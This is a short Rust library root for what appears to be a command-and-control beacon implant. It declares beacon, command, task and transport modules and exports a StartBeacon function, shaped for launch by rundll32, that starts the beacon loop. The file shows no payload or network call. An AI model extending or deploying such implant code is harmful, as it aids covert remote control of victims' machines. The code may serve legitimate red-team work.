pub mod beacon;
pub mod commands;
pub mod tasks;
pub mod transport;

#[cfg(feature = "dll")]
#[unsafe(no_mangle)]
pub extern "C" fn StartBeacon(
    _hwnd: *mut std::ffi::c_void,  // Window handle (ignored)
    _hinst: *mut std::ffi::c_void, // Instance handle (ignored)
    _lpszCmdLine: *mut i8,         // Command line args (ignored)
    _nCmdShow: i32,                // Show state (ignored)
) {
    let rt = match tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
    {
        Ok(rt) => rt,
        Err(_) => return,
    };

    rt.block_on(async {
        beacon::start_beacon().await;
    });
}
